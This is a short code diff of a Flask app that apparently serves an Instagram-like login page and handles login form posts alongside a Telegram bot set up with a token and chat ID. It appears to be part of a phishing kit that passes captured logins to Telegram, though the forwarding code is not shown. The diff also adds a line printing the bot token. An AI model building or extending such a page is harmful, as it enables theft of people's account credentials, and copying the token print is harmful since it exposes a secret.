@@ -4,9 +4,10 @@ from threading import Thread
 import os
 
 # --- Telegram Bot Setup ---
-TOKEN = os.environ.get('TELEGRAM_TOKEN')  # Telegram bot token from environment variables
-CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')  # Chat ID for Telegram bot notifications
-bot = telebot.TeleBot(TOKEN)
+TOKEN = os.environ.get('TELEGRAM_TOKEN')  # Get the bot token from environment variables
+CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')  # Get the chat ID from environment variables
+print(TOKEN)  # Just for debugging (should be removed later for security reasons)
+bot = telebot.TeleBot(TOKEN)  # Initialize the bot with the token
 
 # --- Flask Setup ---
 app = Flask(__name__)
@@ -18,7 +19,7 @@ def send_message_to_bot(message):
 # --- Route to serve login page (Instagram-like) ---
 @app.route('/')
 def login_page():
-    return render_template('login_page.html')
+    return render_template('login_page.html')  # Make sure this file exists
 
 # --- Route for form submission (e.g., login) ---
 @app.route('/login', methods=['POST'])
